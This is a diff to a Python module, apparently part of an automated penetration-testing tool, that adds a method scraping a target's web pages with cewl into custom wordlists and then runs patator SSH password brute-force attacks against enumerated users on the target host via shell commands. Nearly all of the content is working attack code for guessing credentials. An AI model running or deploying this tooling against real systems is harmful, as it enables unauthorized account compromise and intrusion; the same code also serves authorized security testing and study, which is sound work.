@@ -4,9 +4,9 @@ import os
 from subprocess import call
 from sty import fg, bg, ef, rs
 import json
+from lib import nmapParser
 
 # from lib import searchsploits
-# from lib import nmapParser
 
 
 class Brute:
@@ -16,19 +16,60 @@ class Brute:
         self.port = port
         self.unique_users = []
 
+    def CewlWordlist(self):
+        cwd = os.getcwd()
+        reportDir = f"{cwd}/{self.target}-Report"
+        if os.path.exists(f"{reportDir}/aquatone/urls.txt"):
+            if not os.path.exists(f"{reportDir}/wordlists"):
+                os.makedirs(f"{reportDir}/wordlists")
+            url_list = []
+            try:
+                urls_file = f"{reportDir}/aquatone/urls.txt"
+                with open(urls_file, "r") as uf:
+                    for line in uf:
+                        if "index.html" in line:
+                            url_list.append(line.rstrip())
+                        if "index.php" in line:
+                            url_list.append(line.rstrip())
+                wordlist = sorted(set(url_list))
+            except FileNotFoundError as fnf_error:
+                print(fnf_error)
+                exit()
+            # print(wordlist)
+            cewl_cmds = []
+            if len(wordlist) != 0:
+                counter = 0
+                for url in wordlist:
+                    counter += 1
+                    cewl_cmds.append(
+                        f"cewl {url} -m 3 -w {reportDir}/wordlists/cewl-{counter}-list.txt"
+                    )
+            if len(cewl_cmds) != 0:
+                for cmd in cewl_cmds:
+                    call(cmd, shell=True)
+            words = []
+            try:
+                with open("/usr/share/seclists/Passwords/probable-v2-top1575.txt", "r") as prob:
+                    for line in prob:
+                        words.append(line.rstrip())
+                for wl in os.listdir(f"{reportDir}/wordlists"):
+                    wlfile = f"{reportDir}/wordlists/{wl}"
+                    with open(wlfile, "r") as wlf:
+                        for line in wlf:
+                            words.append(line.rstrip())
+                        with open(f"{reportDir}/wordlists/all.txt", "a") as allwls:
+                            string_words = "\n".join(map(str, words))
+                            allwls.write(str(string_words))
+            except FileNotFoundError as fnf_error:
+                print(fnf_error)
+
     def SshUsersBrute(self):
         cmd_info = "[" + fg.green + "+" + fg.rs + "]"
         green = fg.li_green
         teal = fg.li_cyan
         reset = fg.rs
         cwd = os.getcwd()
-        # np = nmapParser.NmapParserFunk(self.target)
-        # np.openPorts()
-        # ssh_ports = np.ssh_ports
-        # ss = searchsploits.Search(self.target)
-        # ss.Scan()
-        # ssh_info = ss.ssh_info
-        # if "OpenSSH" in ssh_info:
+        self.CewlWordlist()
         reportDir = f"{cwd}/{self.target}-Report"
         if not os.path.exists(f"{reportDir}/ssh"):
             os.makedirs(f"{reportDir}/ssh")
@@ -166,11 +207,24 @@ class Brute:
             exit()
 
         if len(self.unique_users) > 0 and (len(self.unique_users) < 4):
-            for u in self.unique_users:
-                print(f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}")
-                patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
-                print(f"{cmd_info} {patator_cmd}")
-                call(patator_cmd, shell=True)
+            if os.path.exists(f"{reportDir}/wordlists/all.txt"):
+                cewl_wordlist = f"{reportDir}/wordlists/all.txt"
+                if os.path.getsize(cewl_wordlist) > 0:
+                    for u in self.unique_users:
+                        print(
+                            f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
+                        )
+                        patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0={cewl_wordlist} persistent=0 -x ignore:mesg='Authentication failed.'"""
+                        print(f"{cmd_info} {patator_cmd}")
+                        call(patator_cmd, shell=True)
+            else:
+                for u in self.unique_users:
+                    print(
+                        f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
+                    )
+                    patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
+                    print(f"{cmd_info} {patator_cmd}")
+                    call(patator_cmd, shell=True)
 
 
 class BruteSingleUser:
